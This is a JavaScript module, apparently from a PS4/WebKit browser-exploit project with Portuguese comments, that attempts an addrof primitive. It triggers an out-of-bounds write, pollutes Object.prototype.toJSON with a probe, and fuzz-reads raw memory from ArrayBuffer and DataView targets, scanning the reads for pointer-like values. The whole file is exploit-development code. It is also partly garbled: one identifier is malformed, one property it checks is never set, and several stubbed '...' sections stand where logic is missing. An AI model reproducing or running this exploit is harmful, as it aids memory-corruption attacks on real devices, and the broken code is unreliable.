// js/script3/testArrayBufferVictimCrash.mjs (v74_CorruptTargetInProbe)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute, // Usaremos para a corrupção principal
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // Para STRUCTURE_ID_OFFSET etc.

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP = "OriginalHeisenbug_TypedArrayAddrof_v74_CorruptTargetInProbe";

// Variáveis globais ao módulo
let captured_fuzz_reads_for_AB_v74 = null;
let captured_fuzz_reads_for_DV_v74 = null;

let leak_target_buffer_v74 = null;
let leak_target_dataview_v74 = null;
let victim_typed_array_ref_v74 = null; // O Uint8Array inicial
let first_call_details_object_ref_v74 = null; // O objeto retornado pela Call #1 da sonda
let probe_call_count_v74 = 0;
let all_probe_interaction_details_v74 = [];


const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Corrupção inicial
const OOB_WRITE_VALUE = 0xFFFFFFFF; // Valor para a corrupção inicial
const PROBE_CALL_LIMIT_V74 = 10; // Limite de chamadas da sonda
// Offsets para ler DENTRO do leak_target_buffer/dataview quando eles são 'this' na sonda
const FUZZ_READ_OFFSETS_V74 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30]; 

// Placeholder para um Structure ID de JSObject que gostaríamos de usar.
// Idealmente, isso seria vazado de um objeto JSObject real. Por enquanto, é null.
const TARGET_JS flexiblesOBJECT_STRUCTURE_ID_V74 = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID;


function toJSON_TA_Probe_CorruptTargetInProbe_v74() {
    probe_call_count_v74++;
    const call_num = probe_call_count_v74;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP,
        this_type: Object.prototype.toString.call(this),
        this_is_victim_typed_array: (this === victim_typed_array_ref_v74),
        this_is_C1_details: (this === first_call_details_object_ref_v74 && first_call_details_object_ref_v74 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v74 && leak_target_buffer_v74 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v74 && leak_target_dataview_v74 !== null),
        corruption_attempt_status: null,
        fuzz_capture_status: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictimTA? ${current_call_details.this_is_victim_typed_array}. IsC1? ${current_call_details.this_is_C1_details}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V74) { all_probe_interaction_details_v74.push({...current_call_details}); return { recursion_stopped_v74: true }; }

        if (call_num === 1 && current_call_details.this_is_victim_typed_array) {
            logS3(`[PROBE_V74] Call #${call_num}: 'this' is victim_typed_array. Creating C1_details with AB and DV payloads.`, "info");
            first_call_details_object_ref_v74 = { // Este é C1_details
                call_number_when_created: call_num, // Para identificar este objeto C1
                payload_AB: leak_target_buffer_v74,
                payload_DV: leak_target_dataview_v74
            };
            all_probe_interaction_details_v74.push({...current_call_details}); // Log da P1
            return first_call_details_object_ref_v74; 
        } 
        else if (current_call_details.this_is_leak_target_AB || current_call_details.this_is_leak_target_DV) {
            const target_name = current_call_details.this_is_leak_target_AB ? "ArrayBuffer_LeakTarget" : "DataView_LeakTarget";
            logS3(`[PROBE_V74] Call #${call_num}: 'this' IS THE ${target_name}! Original type: ${current_call_details.this_type}`, "critical");

            // TENTATIVA DE CORRUPÇÃO / ESCRITA DIRETA NO 'this' (que é o leak_target_buffer ou leak_target_dataview)
            // A esperança é que a Type Confusion PRINCIPAL (causada pela escrita OOB em 0x7C)
            // torne este 'this' (ArrayBuffer ou DataView) suscetível a escritas como se fosse um JSObject.
            if (Object.prototype.toString.call(this) === '[object Object]') { // Checa se o AB/DV JÁ é visto como [object Object] aqui
                 logS3(`[PROBE_V74]   !!!! ${target_name} ('this') is ALREADY [object Object] in Call #${call_num} !!!!`, "vuln");
                 current_call_details.corruption_attempt_status = `${target_name} was already [object Object].`;
                 // Se já está confuso, tentar escrever nele diretamente.
                 try {
                    this[0] = leak_target_buffer_v74; // Tentar vazar o próprio buffer (como ponteiro)
                    this[1] = leak_target_dataview_v74; // Tentar vazar o próprio dataview
                    logS3(`[PROBE_V74]    Attempted to write buffer/dataview to properties 0,1 of confused ${target_name}.`, "info");
                 } catch(e_direct_write) {
                    logS3(`[PROBE_V74]    Error writing props to confused ${target_name}: ${e_direct_write.message}`, "warn");
                    current_call_details.corruption_attempt_status += ` DirectWriteErr: ${e_direct_write.message}`;
                 }
            } else {
                // Se não está confuso para [object Object], uma escrita direta não fará addrof.
                // Apenas logar. A corrupção de structureID aqui seria muito complexa sem addrof(this).
                current_call_details.corruption_attempt_status = `${target_name} ('this') type is ${current_call_details.this_type}, no direct corruption attempted.`;
                logS3(`[PROBE_V74]   ${target_name} ('this') is not seen as [object Object]. No specific corruption write done.`, "info");
            }

            // Agora, o FUZZING DE LEITURA para ver o que tem dentro do 'this' (o leak_target)
            let fuzzed_reads = [];
            try {
                let view_on_this = new DataView(this instanceof ArrayBuffer ? this : this.buffer); // Usa this.buffer se this for DataView
                for (const offset of FUZZ_READ_OFFSETS_V74) {
                    let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view_on_this.byteLength<(offset+8)){err_msg="OOB";}else{low=view_on_this.getUint32(offset,true);high=view_on_this.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg});
                }
                current_call_details.fuzz_capture_status = `${target_name} Fuzz captured ${fuzzed_reads.length} reads.`;
                if (current_call_details.this_is_leak_target_AB) captured_fuzz_reads_for_AB_v74 = fuzzed_reads;
                else if (current_call_details.this_is_leak_target_DV) captured_fuzz_reads_for_DV_v74 = fuzzed_reads;
                logS3(`[PROBE_V74]   ${current_call_details.fuzz_capture_status} (First read: ${fuzzed_reads[0]?.int64 || 'N/A'})`, "vuln");
            } catch (e) { current_call_details.error_in_probe += ` FuzzReadErr: ${e.message};`; }
            
            all_probe_interaction_details_v74.push({...current_call_details});
            return { marker_fuzz_done_v74: true, target: target_name, call_num_processed: call_num };
        }
        else if (current_call_details.this_is_C1 && current_call_details.this_type === '[object Object]') {
            logS3(`[PROBE_V74] Call #${call_num}: 'this' is C1_details_obj and is [object Object] (confused). This is unexpected here. Returning 'this'.`, "warn");
            all_probe_interaction_details_v74.push({...current_call_details});
            return this; // C1 já está confuso, retornar para serialização
        }
        // ... (outros casos, retorno genérico)
    } catch (e_probe_outer) { current_call_details.error_in_probe += ` OuterProbeErr: ${e_probe_outer.message};`; }
    all_probe_interaction_details_v74.push({...current_call_details});
    return `GenericReturn_Call${call_num}`;
}


export async function executeTypedArrayVictimAddrofTest_CorruptTargetInProbe() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (CorruptTargetInProbe) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP} Init...`;

    // Reset das variáveis globais do módulo
    captured_fuzz_reads_for_AB_v74 = null; captured_fuzz_reads_for_DV_v74 = null;
    probe_call_count_v74 = 0; all_probe_interaction_details_v74 = [];
    victim_typed_array_ref_v74 = null; first_call_details_object_ref_v74 = null;
    // leak_target_buffer/dataview são recriados abaixo

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer Fuzz: Default" };
    let addrof_B_result = { success: false, msg: "Addrof DataView Fuzz: Default" };
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write done.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v74 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); // Vítima principal para iniciar JSON.stringify
        leak_target_buffer_v74 = new ArrayBuffer(0x80); // Alvo do Addrof/Fuzz
        leak_target_dataview_v74 = new DataView(new ArrayBuffer(0x80)); // Outro alvo
        // Preencher os buffers alvo para sabermos se foram corrompidos
        new Uint32Array(leak_target_buffer_v74).fill(0xDEADBEEF);
        for(let i=0; i < leak_target_dataview_v74.byteLength; i+=4) { if(i+4 <= leak_target_dataview_v74.byteLength) leak_target_dataview_v74.setUint32(i, 0xCAFEBABE, true); }

        logS3(`STEP 2: Victim and Leak Target AB/DV created.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_CorruptTargetInProbe_v74, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v74);
            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ stringifyOutput_parsed = {parse_error: e.message, raw: rawStringifyOutput};}

            logS3("STEP 3: Analyzing fuzz data from side-channels (v74)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false; // Será true se algum fuzzing ocorreu

            const process_fuzz_data = (fuzzed_reads_array, target_addrof_result, objTypeName) => {
                // ... (lógica de process_fuzz_data da v73, adaptada para v74) ...
                // A lógica é: iterar fuzzed_reads_array, checar por valores que pareçam ponteiros
                // Se encontrar, target_addrof_result.success = true e preencher msg.
                // heisenbugIndication = true se fuzzed_reads_array tiver dados.
                 if (fuzzed_reads_array && Array.isArray(fuzzed_reads_array)) {
                    heisenbugIndication = true; // Indica que o alvo foi 'this' e o fuzzing ocorreu
                    logS3(`  V74_ANALYSIS: Processing ${fuzzed_reads_array.length} captured fuzz reads for ${objTypeName}.`, "good");
                    let found_ptr = false;
                    for (const read_attempt of fuzzed_reads_array) {
                        if (read_attempt.error) continue;
                        const highVal = parseInt(read_attempt.high, 16);
                        const lowVal = parseInt(read_attempt.low, 16);
                        
                        // Heurística de ponteiro mais genérica (para PS4, ponteiros de heap podem começar com 0x8 ou 0x9)
                        // E ponteiros de texto/código podem ser menores.
                        // Um ponteiro válido não deve ser um double "normal" pequeno ou muito grande.
                        // E deve ser alinhado se for um ponteiro de objeto (geralmente).
                        let isPotentialPtr = false;
                        if ((highVal !== 0 || lowVal !== 0) && // Não é nulo
                            (highVal < 0x000F0000) && // Não é um valor de double muito grande
                            !(highVal === 0x7FF00000 && lowVal === 0x00000000) && // Não é +/- Infinity
                            !(highVal === 0xFFF00000 && lowVal === 0x00000000) && // Não é +/- Infinity
                            !isNaN(read_attempt.dbl) // Não é NaN (que pode ter representações variadas)
                           ) {
                             // Heurística adicional: ponteiros de heap no PS4 tendem a ter bits altos específicos
                             // ou serem > 0x800000000 (para heap de usuário)
                             // Esta heurística pode precisar de ajuste fino.
                             if (highVal >= 0x00000008 && highVal < 0x0000000E ) { // Exemplo para alguns heaps comuns
                                isPotentialPtr = true;
                             } else if (lowVal > 0x100000 && (lowVal & 0x7) === 0) { // Alinhado, não muito pequeno
                                isPotentialPtr = true;
                             }
                        }

                        if(isPotentialPtr){
                            target_addrof_result.success = true;
                            target_addrof_result.msg = `V74 SUCCESS (${objTypeName} Fuzz): Potential Ptr ${read_attempt.int64} @${read_attempt.offset}`;
                            logS3(`  !!!! V74 POTENTIAL POINTER for ${objTypeName} @${read_attempt.offset}: ${read_attempt.int64} (Dbl: ${read_attempt.dbl}) !!!!`, "vuln");
                            found_ptr = true;
                            break; 
                        }
                    }
                    if(!found_ptr){ target_addrof_result.msg = `V74 Fuzz for ${objTypeName}: No clear pointer found. First read: ${fuzzed_reads_array[0]?.int64 || 'N/A'}`; }
                } else if (!target_addrof_result.success) { target_addrof_result.msg = `V74 No fuzz data in side-channel for ${objTypeName}.`; }
            };

            process_fuzz_data(captured_fuzz_reads_for_AB_v74, addrof_A_result, "ArrayBufferTarget");
            process_fuzz_data(captured_fuzz_reads_for_DV_v74, addrof_B_result, "DataViewTarget");
            
            // A "Heisenbug" aqui significa que a sonda foi chamada nos alvos de leak.
            if(addrof_A_result.success||addrof_B_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP}: Addr SUCCESS!`;}
            else if(heisenbugIndication){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP}: Target Reached, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V74_CTIP}: No Target Reached?`;}

        } catch (e) { errorCapturedMain = e; /* ... */ } finally { /* ... */ }
    } catch (e) { errorCapturedMain = e; /* ... */ }
    finally {
        // ... (limpeza e logs finais)
        if (all_probe_interaction_details_v74 && Array.isArray(all_probe_interaction_details_v74)) {
            // collected_probe_details_for_return = all_probe_interaction_details_v74.map(d => (d && typeof d === 'object' ? {...d} : d));
        } else { /* collected_probe_details_for_return = []; */ }
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v74}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof AB Target: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof DV Target: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        victim_typed_array_ref_v74 = null; all_probe_interaction_details_v74 = []; probe_call_count_v74 = 0; first_call_details_object_ref_v74 = null; leak_target_buffer_v74 = null; leak_target_dataview_v74 = null; captured_fuzz_reads_for_AB_v74 = null; captured_fuzz_reads_for_DV_v74 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain, stringifyResult: stringifyOutput_parsed, 
        // Retornar os detalhes da última chamada para o runner, ou o mais relevante.
        toJSON_details: (all_probe_interaction_details_v74 && all_probe_interaction_details_v74.length > 0) ? {...all_probe_interaction_details_v74[all_probe_interaction_details_v74.length-1]} : null,
        all_probe_calls_for_analysis: all_probe_interaction_details_v74.map(d=>({...d})), // Cópia de todos os detalhes
        total_probe_calls: probe_call_count_v74,
        addrof_A_result: addrof_A_result, addrof_B_result: addrof_B_result
    };
};
